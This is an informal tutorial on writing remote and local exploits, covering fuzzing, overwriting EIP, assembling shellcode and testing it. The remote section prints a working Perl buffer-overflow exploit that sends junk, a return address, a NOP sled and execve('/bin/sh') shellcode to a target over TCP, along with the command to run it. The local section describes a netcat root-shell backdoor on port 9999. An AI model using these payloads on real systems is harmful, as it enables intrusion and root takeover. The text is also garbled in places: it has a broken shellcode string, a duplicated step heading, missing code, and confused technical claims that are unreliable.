-----# Introduction On Exploits

Nowadays the word exploit is becoming frightened, thousands of peoples
that are in field of IT should(is a must) know how to make a exploit or even
how to defend by eexploits.Out there are hundreds of exploits
that are published in several websites like exploit-db.com, secunia.com
1337day.com etc.Exploitation means using a program routine or a 0day attack
to own the OS or crashing the program.Exploiting a program is a clever
way of getting the computer to do what you want it to, even if the currently
running program was designed to prevent that actions.It can do only what you 
have programmed to do.To get rid of exploit you should learn assembly language
as it is the language wich can talk directly to the kernel, C,c++,Perl, Python 
programming wich by system calls() we can call the kernel.For me those languages
are enough but since the Computer are in evolution you should not stop learning 
other programming language.In this paper i wont publish no exploit but to explain
the make of it, the importance of it, and clearing some misunderstanding in our mind,
in our brain, so when we read a source code should not become confused.But someone 
in IRC asked to me how many types of exploit do we have.In reality there are 
too many types of exploits but i will mention the most important
exploits that are used todays.

-----# Remote exploits

Exploits can be developed almost at any operation system, but the most
comfortable OS is Linux and Windows todays.I dont know about Windows cuz 
we need to install tools like microsoft visual c++,python 2.7 or perl and using them 
in CMD.But in Linux the gcc, as, ld are the GNU defaults compilers.
In Linux you should have learnt sockets to get a routine and get the work done.
We have the shell wich is too important to program an exploit.But in this section
the purpose is understanding the remote exploits and creating the basic of it.
Getting rid of the vulnerability of the program you want or the system you want 
to get prigileges on the System.Here we go in the Art of Fuzzing wich we send 
many characters to overflow or to flood and crash the Program.But how do we know
what is the address of the eip, to get exploit it in way ret2eip wich means
ret2eip=Return the Address of eip.Im explaining the steps:

 
[Step One]
Before you develop any exploit, you need to determine whether a vulnerability
exists in the application. This is where the art of fuzzing comes into play.
Since it is remote we can't know the address of register in wich we crashed the program.
This step is getting a better fuzzer like Spike and Metasploit.When the 
fuzzer will be stopped we only get the length of the char's.

[Step Two]
Get on work with fuzzer.Practice it.Run it.In this step we ran the fuzzer
and what we get only the length of the chars but to exploit a program we need eip.
Length(X1h21hsdpgm234jlasn356kklasdn432210ifaslkj4120sd .................) etc.
We only have the length.

[Step Three]
We download the program in our system and test it with the fuzzer.As the target is
127.0.0.1 we launch a debugger like Ollydbg and we will watch what will happen
when the fuzz will start.The program will be overflowed and the eip will be on red
line.Here we got what we wanted to have.We got the eip, now what.

[Step Four]
Prepare the shellcode.What is shellcode?-Shellcode is made in assembly language
with instructions to get the shell with system calls like execve or execl.

#########
Note	#
#########
Im having in mind that you know the assembly and how to get the shellcode from it
with programs like objdump, gcc etc.

[Step Four]
Prepare the exploit with the need of.In this section im using a perl script
to introduce you on exploiting in a basic way.

#!/usr/bin/perl
use IO::Socket;

$header = "TRUN /.:/"; 					(we put the TRUN header here)
$junk = "" x pattern;					(Junk or like garbage to overflow)
							(We can get the pattern with 
							pattern_create tool of metasploit)
$eip = pack('v', 0x85f61a2f);				(The eip, the most important of exploit)
$nop = "\x90" x 20;					(NOP=No Operation, Making shellcode nonull)
$shellcode = 						(The shellcode)
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x46\xcd\x80\x51\" +
"x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x53" +
"\x89\xe1\x31\xc0\xb0\x0b\xcd\x80";
				

$socket = IO::Socket::INET->new(			(Socket I/O INET FAMILY)
Proto => "tcp",						(TCP Protocol)
PeerAddr => "$ARGV[0]",					(First Arg)
PeerPort => "$ARGV[1]",					(Second Arg)
);

socket->recv($serverdata, 1024);			(Data we receive)
print $serverdata;					(Print that data)
$socket->send($header.$junk.$eip.$nop.$shellcode);	(Using socket to send them all)

[Step Five]
We have the exploit, now get on run it.For the exploit above we type the command:
root@MINDZSEC~:/root$ ./exploit.pl target host
And if you would be succesful you will get a shell in system,and if you 
have the shell you can get on exploit kernel to get root privileges. Here we go
on Local Exploits wich will be explained now.

-----# Local Exploits

These are the most dificult exploit to develop becauze here you should learn UNIX environment
and syscalls() that are nedded to have a shell on uid.UID stands for user id, and the 
uid of root will be always 0.To understand this type of exploit you should absolutely know
assembly language to work around with __NR_$syscall.__NR_$syscall are liste in dir of
/usr/include/asm-generic/unistd.h where there are all number for each respective 
syscall().Assembly language is the most used outthere for making shellcode, here we have 
an program wich is pause.asm

----------------------------------------------------------------------------------------------------

root@MINDZSEC~:/root$ cat pause.asm

section .text	; Text section
global _start	; _start is global

_start:		; _start function
xor ebx, ebx	; Zero out ebx register
mov al, 29	; Insert __NR_pause 11 syscall, see "Appendix A"
int 0x80	; Syscall execute

Assemble and Link

root@MINDZSEC~:/root$ nasm -f elf pause.asm && ld pause.o -o pause

Time to run

root@MINDZSEC~:/root$ ./pause
^c
It worked and pause the System, I used CTRL-C to exit from program.

Now Get the Opcodes

root@MINDZSEC~:/root$ objdump -d pause.o

pause.o:     file format elf32-i386

Disassembly of section .text:

00000000 <_start>:
   0:	31 db                	xor    %ebx,%ebx
   2:	b0 1d                	mov    $0x1d,%al
   4:	cd 80                	int    $0x80

This is a small shellcode but what would you do if it will be long.

I used xxd to make the way easier, see Apendix B.

root@MINDZSEC~:/root$ ./xxd pause.o

"\x31\xdb\xb0\x1d\xcd\x80"

Test Shellcode

root@MINDZSEC~:/root$ ./shtest "\x31\xdb\xb0\x1d\xcd\x80"

Shellcode at 0x804b140
Registers before call:
  esp: 0xbfbf0d70, ebp: 0xbfbf0da8
  esi: (nil), edi: (nil)
----------------------
^C

Here I used the shellcode tester made by hellman, see Apendix C.We saw that the system
pauses and executed the shellcode with success.

----------------------------------------------------------------------------------------------------

But the purpose of local exploit is to get superuser privileges, by syscall it can be done
where we use routines to tire up the system and break the linux-so.gate.1 to get uid=0.
That is the main purpose of local exploit, since you have exploit a system you need 
priveleges to conduct actions on this system.They can't be call exploits but a SETUID
program to get done with rid of system <-- That what Linus Torvalds told.
And it is right since we make a program in assembly language with system calls
and we run them to have root shell.The opcodes are the hex codes that make a direct call
to the kernel.Thus codes speaks with kernel and tell it to get the root shell or 
i will overflow you.To take a brief understanding in shellcodes you should read
papers that are published outside on Internet or read Books that are dedicated
on this are of Computer Programming Science.
Developing a local exploit we should either know heap overflows wich plays around
with programs, buffer overflows wich plays around with buffer register and the 
stack-based overflows.

      	:Heap Overflows:
		Read article of W00w00 on heaptut
		http://www.cgsecurity.org/exploit/heaptut.txt
	:Buffer Overflows:
		Read article of Saif El-Sherei
		http://www.exploit-db.com/docs/28475.pdf
	:Stack-based buffer overflows:
		Read article of Aleph1 Smashing the stack
		http://www.phrack.org/issues/49/14.html#article

After you read them you will get a better understand on how the system works and how
register works and how to make them doing what you programmed the program to do.Today 
all of people are focused on social media and had left the computer science, they are 
no more dedicated on reading, today lechers or script kiddies reads some paper and copys
the program's to merge into one and they call themselves programmers.No, thats wrong, they
will never become programmers that copies other people's programs to own it.So why i connected
this sentece on here.All what i want to say that script kiddies wont have ideas on systems
only if they copy the programs, so to make local exploit we should have an idea and a 
purpose with lot of imaginary and learn how the system works.
In a clever way im going to say that making SHELLCODE and EXPLOIT need IDEAS.

Before going to an "real-life local exploit" i will explain and one more shellcode wich
uses netcat to get a uid=0 gid=0 groups=0 root shell:

----------------------------------------------------------------------------------------------------

Netcat Shellcode.asm

List the program.

From any machine you can connect to this by nc IP 9999 and get a root shell
See Appendix for a universal Shellcode on getting shell.

----------------------------------------------------------------------------------------------------

You would ask, Why you use this example when we are talking to local exploits.This program is 
often called a backdoor and it is used a lot on all programs from big Companies.Shellcode
can have the work done in last two minutes as im saying learn it.I added here this shellcode
so you can add this in your local exploits to get the work done and get a root shell to
conduct whatever command you wanted to.

Now it time to present you a local exploit as example and explain you the sections of it.
I said that i wont give you no exploit in this paper so i will just explain how they works
to you and get a better understand on exploits so you can create them.

}

And we compile it and we get a shell, this is an local exploit of 1997, i took just as a 
example.So what I told you about shellcodes, they are used at almost of local exploit nowadays.

----------------------------------------------------------------------------------------------------

A begginer programmer will see this source code and will say that i can't learn them till my end of life
but it is wrong.That is the first disappointed in our heart.So how to get rid of programming,
first we need to be creative and have ideas as i told again.

NOTE #
######
Have a learn of kernel syscalls(), their numbers, have a learn of shellcodes and
how to understand them, learn programming languages as much as you can.

		APPENDIX C - Shtester Program by hellman
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

I added the program here not to get a long paper, but i added for you in case that the author
will erase it or the website will be shutdown

    Shellcode testing program
    Usage:
        shtest [-s socked_fd_no] {-f file | $'\xeb\xfe' | '\xb8\x39\x05\x00\x00\xc3'}
    Usage example:
        $ shtest $'\xeb\xfe'                 # raw shellcode
        $ shtest '\xb8\x39\x05\x00\x00\xc3'  # escaped shellcode

        $ shtest -s 5 -f test.sc             # create socket at fd=5
            # Allows to test staged shellcodes
            # Flow is redirected like this: STDIN -> SOCKET -> STDOUT
